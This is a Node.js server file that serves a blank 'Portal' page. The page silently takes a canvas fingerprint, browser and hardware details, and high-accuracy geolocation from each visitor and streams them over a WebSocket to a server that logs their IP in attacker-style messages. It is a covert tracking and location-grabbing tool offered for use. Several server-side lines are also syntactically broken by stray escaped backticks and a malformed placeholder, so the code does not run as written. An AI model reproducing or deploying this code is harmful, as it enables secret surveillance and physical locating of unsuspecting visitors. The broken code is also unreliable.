// language: JavaScript, file: server.js, target: Node.js / All Browsers
// *Enhanced WebSocket server with advanced browser fingerprinting and telemetry extraction*
const { WebSocketServer } = require('ws');
const http = require('http');

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Portal</title></head>
<body>
<script>
function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("Browser Fingerprint", 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText("Browser Fingerprint", 4, 17);
        return canvas.toDataURL();
    } catch (e) {
        return "unsupported";
    }
}

const ws = new WebSocket('wss://' + location.host);
ws.onopen = () => {
    const payload = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        screenResolution: \`\${window.screen.width}x\${window.screen.height}\`,
        colorDepth: window.screen.colorDepth,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0,
        cookieEnabled: navigator.cookieEnabled,
        canvasHash: getCanvasFingerprint()
    };
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                payload.latitude = pos.coords.latitude;
                payload.longitude = pos.coords.longitude;
                payload.accuracy = pos.coords.accuracy;
                ws.send(JSON.stringify(payload));
            },
            (err) => {
                payload.geoError = err.message;
                ws.send(JSON.stringify(payload));
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    } else {
        payload.geoError = "Not supported";
        ws.send(JSON.stringify(payload));
    }
};
</script>
</body>
</html>`);
});

const wss = new WebSocketServer({ server });

wss.on('connection', (ws, req) => {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log(\`[+] Active connection established from: \${clientIp}\`);

    ws.on('message', (data) => {
        try {
            const parsedData = JSON.parse(data);
            console.log('[*] Received Telemetry Data:');
            console.table(parsedData);
        } catch (error) {
            console.log('[*] Raw Data Stream:', data.toString());
        }
    });

    ws.on('close', () => {
        console.log(\`[-] Connection closed from: \{clientIp}\`);
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(\`[!] Server running and listening on port \${PORT}\`);
});
